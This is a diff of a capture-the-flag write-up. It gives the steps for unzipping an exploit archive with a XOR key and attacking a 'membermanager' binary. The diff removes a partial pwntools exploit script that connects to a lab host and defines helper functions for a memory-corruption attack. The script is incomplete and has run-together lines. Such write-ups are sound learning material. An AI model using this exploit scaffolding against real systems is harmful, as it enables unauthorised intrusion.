@@ -60,27 +60,3 @@ Cheers - Alex
 11) Unzip "Exploitme.zip" with the same key used fo xor crypted message (securewebincrocks)
 ![[Pasted image 20230914104419.png]]
 12) Exploit the membermanager program
-```python
-#!/usr/bin/python3
-from pwn import * 
-import warnings 
-warnings.simplefilter("ignore") 
-shell = remote('10.13.37.10', 5555) 
-ldiff = 0x3c5520 
-rdiff = 0xf7250 
-sdiff = 0x45390
-def add(size, content): 
-	shell.sendline(b"1")
-	shell.recvuntil(b"size:") 
-	shell.sendline(str(size)) 
-	shell.recvuntil(b"username:") 
-	shell.sendline(content) 
-	shell.recvuntil(b"6. exit")
-def edit(id, mode, content):
-	shell.sendline(b"2") 
-	shell.recvuntil(b"2. insecure edit") 
-	shell.sendline(str(mode)) 
-	shell.recvuntil(b"index:") 
-	shell.sendline(str(id)) 
-	shell.recvuntil(b"new username:") shell.sendline(content) shell.recvuntil(b"6. exit")
-```
